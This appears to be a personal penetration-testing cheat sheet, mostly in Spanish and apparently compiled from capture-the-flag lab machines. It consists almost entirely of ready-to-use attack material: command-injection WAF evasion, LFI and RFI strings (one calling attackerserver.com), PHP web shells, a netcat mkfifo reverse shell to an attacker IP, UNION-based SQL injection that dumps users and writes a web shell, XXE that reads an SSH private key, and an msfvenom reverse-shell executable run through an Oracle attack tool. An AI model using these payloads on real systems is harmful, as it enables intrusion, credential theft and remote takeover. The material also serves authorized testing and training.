#base64
Encuentro un .cap y como no hay internet ni un wireshark ni tcpdump para sacar la info de la máquina víctima es una buena forma de sacar información hacia la máquina anfitrión:

base64 /home/zeus/airgeddon/captured/captured.cap

Sale un churro en base64, pues lo decodifico en cualquier página y saco el user/pass para conectarme por ssh.


#Mirar sitios PHP para ver los usuarios y pass al conectar a la base de datos:
cd /var/www/html
cat /connection.php

#User agent
Quitando los user agent por cualquier cosa, por ejemplo la palabra: javi, se puede evaidr filtros del waf y ver otras cosas de la web.

#Evadir filtros waf
curl "http://10.10.10.69/sync?opt=' whoami'"
curl "http://10.10.10.69/sync?opt=' id'"
curl "http://10.10.10.69/sync?opt=' u'n'ame -a'"
curl "http://10.10.10.69/sync?opt=' l's' /home'"
curl "http://10.10.10.69/sync?opt=' l's' /home/Fl'uxC'apa'cit'orI'n'c'"
curl "http://10.10.10.69/sync?opt=' c'at' /home/Fl'uxC'apa'cit'orI'n'c/u'ser'.'txt''"


#cmsmap
cmsmap.py https://example.com -f W -F --noedb -d


HTTP Enumeration
----------------------------------------------
# Gobuster
gobuster -u <targetip> -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
gobuster -u http://10.10.10.73 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -x .txt,.php
----------------------------------------------
# Dirsearch
python3 dirsearch.py -u http://IP -w ../dicionario.txt -e php,html,htm,txt,json,,
----------------------------------------------

# DIRB:
./dirb http://IP '/home/n0ipr0cs/Diccionarios/DirBuster/directory-list-2.3-medium.txt' -X .php,.html,.txt
---------------------------------------------

# nikto
nıkto -h <targetip>
----------------------------------------------

#recursive-gobuster
recursive-gobuster.pyz http://10.10.10.111:9999/ -t 50 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt



# curl
curl -v -X OPTIONS http://<targetip>/test/
curl --upload-file <file name> -v --url <url> -0 --http1.0
----------------------------------------------

# LFI
# PHP Wrapper
php://filter/convert.base64-encode/resource=index.php
# Null Byte: Dado que el archivo/etc/passwd.php no existe. Sin embargo, si añadimos el nullbyte al final de nuestra cadena de ataque, el. php no será tenido en cuenta. Así que añadimos %00 al final de nuestra cadena de ataque:
?page=../../../../../../etc/passwd%00
# LFI Básico:
/index.php?page=../../../etc/passwd
# Url-Encode:
/index.php?page=%252e%252e%252fetc%252fpasswd

----------------------------------------------


#PHP Wrapper zip://
echo "<?php \$_GET['param1'](\$_GET['param2']); ?>" > shell.php
zip -0 payload.zip payload.php;   
mv payload.zip shell.jpg;    
rm payload.php
http://ex.com/index.php?page=zip://shell.jpg%23payload.php


# RFI
?page=http://attackerserver.com/evil.txt

----------------------------------------------
# Command Execution
<?php system('ls -la');?>
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attackerip> 1234 >/tmp/f');?>

---------------------------------------------

# LFI and RCE

# Inject code execution
<?php echo system($_REQUEST["cmd"]);?>
# Go to LFI vuln and
?=…….&cmd=ls
# /lfi.php?page=/proc/self/environ&cmd=id 


----------------------------------------------
# SQL Injection (manual)
photoalbum.php?id=1'

# find the number of columns
photoalbum.php?id=1 order by 8

# Find space to output db
?id=1 union select 1,2,3,4,5,6,7,8

# Get username of the sql-user
?id=1 union select 1,2,3,4,user(),6,7,8

# Get version
?id=1 union select 1,2,3,4,version(),6,7,8

# Get all tables
?id=1 union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables

# Get all columns from a specific table
?id=1 union select 1,2,3, column_name ,5,6,7,8 from information_schema.columns where table_name=‘users’
?id=1 union select 1,2,3, group_concat(column_name) ,5,6,7,8 from information_schema.columns() where table_name=‘users’
.. 1,2,3, group_concat(user_id, 0x3a, first_name, 0x3a, last_name, 0x3a, email, 0x3a, pass, 0x3a, user_level) ,5,6,7,8 from users

# view files
' union select 1,2,3, load_file(‘/etc/passwd’) ,5,6,7,8 -- -
' union select 1,2,3, load_file(‘/var/www/login.php’) ,5,6,7,8 -- -
' union select 1,2,3, load_file(‘/var/www/includes/config.inc.php’) ,5,6,7,8 -- -
' union select 1,2,3, load_file(‘/var/www/mysqli_connect.php’) ,5,6,7,8 -- -	

# upload files
' union select 1,2,3, 'this is a test message' ,5,6,7,8 into outfile '/var/www/test'-- -	
' union select 1,2,3, load_file('/var/www/test') ,5,6,7,8 -- -	
' union select null,null,null, "<?php system($_GET['cmd']) ?>" ,5,6,7,8 into outfile '/var/www/shell.php' -- -	
' union select null,null,null, load_file('/var/www/shell.php') ,5,6,7,8 -- -

----------------------------------------------

# wordpress
wpscan --url http://.... --log
wpscan --url http://... --enumerate u --log
wpscan --url http://<targetip> --wordlist wordlist.txt --username example_username
http://....../wp-admin
http://...../wp-content/uploads/2017/10/file.png

----------------------------------------------
#Windows Command Execution (RFI exploit)

#Connect via netcat to victim (nc -nv <[IP]> <[PORT]>) and send 
<?php echo shell_exec("nc.exe -nlvp 4444 -C:\Windows\System32\cmd.exe");?>
# on kali call the shell
nc -nv 10.11.25.59 4444

----------------------------------------------

# XXE (External XML Entity):
<?xml version="1.0"?>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

<Container>

<Author></Author>

<Subject></Subject>

<Content>

       &xxe;

</Content>

</Container>
* Cambiando el etc/passwd por: file:///home/roosa/.ssh/id_rsa  puedo ver la clave rsa para conectarme por SSH.

# Bypass File Upload Filtering
Una de las técnicas típicas además del Null Byte Injection y las de Content-Type, es la de doble extensión. Esto es simplemente renombrar nuestro script php a shell.php.jpg.

#ODAT: Oracle Database Attacking Tool
python3 odat.py sidguesser -s 10.10.10.82 -p 1521
python3 odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file accounts/oracle_default_userpass.txt        el archivo de pass oracle esta en /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
Con VI editar el fichero:      :%s/ /\//g     con esto lo que hacemos es quitar las separaciones y ponerlo en el formato idoneo para que rule con la tool odat.
msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.10.14.7 LPORT=1234 -f exe > shell.exe
python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe ../../htb/silo/shell.exe --sysdba
nc -nlvp 1234
python3 odat.py externaltable -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --exec /temp shell.exe --sysdba   y tenemos shell!